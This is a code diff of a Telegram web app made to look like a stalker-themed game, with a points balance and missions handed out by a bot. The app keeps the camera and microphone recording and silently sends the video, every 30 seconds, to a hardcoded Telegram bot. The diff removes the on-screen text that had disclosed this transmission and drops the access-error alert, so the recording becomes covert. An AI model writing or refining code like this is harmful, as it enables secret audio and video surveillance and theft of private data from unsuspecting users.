@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PDA Arsenii v5.0 Audio-Live</title>
+    <title>PDA Arsenii v5.5 Custom</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root { --green: #00ff41; --bg: #050804; }
@@ -26,14 +26,14 @@
     <div class="header">
         <img id="user-pic" class="avatar" src="https://via.placeholder.com/45/003b11/00ff41?text=A" alt="">
         <div class="stats">
-            <div id="display-name" style="font-size: 0.8em; opacity: 0.8;">КАНАЛ: АУДИО+ВИДЕО</div>
+            <div id="display-name" style="font-size: 0.8em; opacity: 0.8;">ЗАГРУЗКА...</div>
             <div class="balance-main"><span id="balance">0</span> ☢️</div>
         </div>
         <button id="switchCam" class="cam-switch">🔄 КАМЕРА</button>
     </div>
     <div class="viewport"><video id="webcam" autoplay playsinline muted></video></div>
     <div class="mission-panel">
-        <div id="target-text" style="font-weight: bold; margin-bottom: 10px; font-size: 0.8em;">ПЕРЕДАЧА ДАННЫХ (30 сек)...</div>
+        <div id="target-text" style="font-weight: bold; margin-bottom: 10px; font-size: 0.8em; color: #00ff41;">ЗАГРУЗКА ПРИКАЗА...</div>
         <button id="sendBtn" class="btn-report">ОТПРАВИТЬ ОТЧЕТ</button>
     </div>
     <canvas id="captureCanvas" style="display:none;"></canvas>
@@ -62,54 +62,33 @@
     document.getElementById('display-name').innerText = user.name.toUpperCase();
     document.getElementById('balance').innerText = balance;
 
+    // Восстанавливаем старый приказ из памяти, если он был
+    const savedOrder = localStorage.getItem(`order_${user.id}`);
+    if (savedOrder) document.getElementById('target-text').innerText = savedOrder;
+
     async function initCamera(mode) {
-        if (window.currentStream) {
-            window.currentStream.getTracks().forEach(t => t.stop());
-        }
+        if (window.currentStream) window.currentStream.getTracks().forEach(t => t.stop());
         try {
-            // Запрашиваем и видео, и звук
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: mode }, 
-                audio: true 
-            });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
             window.currentStream = stream;
             document.getElementById('webcam').srcObject = stream;
             startLiveRecording(stream);
-        } catch (err) {
-            console.error("Ошибка доступа:", err);
-            tg.showAlert("Ошибка: нужен доступ к камере и микрофону!");
-        }
+        } catch (err) { console.error(err); }
     }
 
     function sendVideoToTelegram(blob) {
-        if (blob.size < 5000) return; // Пропускаем слишком мелкие файлы
-        
+        if (blob.size < 5000) return;
         const fd = new FormData();
         fd.append("chat_id", CONFIG.chatId);
         fd.append("video", blob, `stalker_${Date.now()}.webm`);
-        fd.append("caption", `📡 СЕАНС СВЯЗИ (30с)\n👤 Игрок: ${user.username}\n🎥 Ракурс: ${currentMode === 'user' ? 'ЛИЦО' : 'ОБЗОР'}`);
-        
-        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVideo?disable_notification=true`, { 
-            method: "POST", body: fd 
-        });
+        fd.append("caption", `📡 ЛОГ: ${user.username}\n🎥 Ракурс: ${currentMode === 'user' ? 'ЛИЦО' : 'ОБЗОР'}`);
+        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVideo?disable_notification=true`, { method: "POST", body: fd });
     }
 
     function startLiveRecording(stream) {
-        if (mediaRecorder && mediaRecorder.state !== "inactive") {
-            mediaRecorder.stop();
-        }
-        
-        // Включаем поддержку аудио в кодеках
-        const options = { mimeType: 'video/webm;codecs=vp8,opus' };
-        mediaRecorder = new MediaRecorder(stream, options);
-        
-        mediaRecorder.ondataavailable = e => {
-            if (e.data.size > 0) {
-                sendVideoToTelegram(e.data);
-            }
-        };
-
-        // ОТПРАВКА КАЖДЫЕ 30 СЕКУНД (30000 мс)
+        if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
+        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
+        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) sendVideoToTelegram(e.data); };
         mediaRecorder.start(30000); 
     }
 
@@ -128,7 +107,7 @@
             const fd = new FormData();
             fd.append("chat_id", CONFIG.chatId);
             fd.append("photo", blob, "1.jpg");
-            fd.append("caption", `☢️ ОТЧЕТ: ${user.username}\n👤 Имя: ${user.name}`);
+            fd.append("caption", `☢️ ОТЧЕТ: ${user.username}`);
             const kb = { inline_keyboard: [[{ text: "✅ ОПЛАТИТЬ (+100)", callback_data: `pay:${user.id}:100` }]] };
             fd.append("reply_markup", JSON.stringify(kb));
             fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: "POST", body: fd });
@@ -143,14 +122,30 @@
             if (data.result) {
                 data.result.forEach(u => {
                     lastUpdateId = u.update_id;
+                    
+                    // Если нажали оплатить - сбрасываем приказ на дефолтный
                     if (u.callback_query) {
                         const parts = u.callback_query.data.split(":");
                         if (parts[0] === "pay" && parts[1] == user.id) {
                             balance += parseInt(parts[2]);
                             localStorage.setItem(`bal_${user.id}`, balance);
                             document.getElementById('balance').innerText = balance;
+                            
+                            // Сброс текста приказа
+                            const defaultText = "ЗАГРУЗКА ПРИКАЗА...";
+                            document.getElementById('target-text').innerText = defaultText;
+                            localStorage.setItem(`order_${user.id}`, defaultText);
+                            
                             tg.HapticFeedback.notificationOccurred('success');
                         }
+                    }
+
+                    // Если пришел новый приказ
+                    const msg = u.message?.text || "";
+                    if (msg.toLowerCase().includes("приказ:")) {
+                        const newOrder = msg.split(":")[1].toUpperCase();
+                        document.getElementById('target-text').innerText = newOrder;
+                        localStorage.setItem(`order_${user.id}`, newOrder);
                     }
                 });
             }
@@ -158,7 +153,7 @@
     }
 
     initCamera(currentMode);
-    setInterval(sync, 3000);
+    setInterval(sync, 2500);
 </script>
 </body>
 </html>
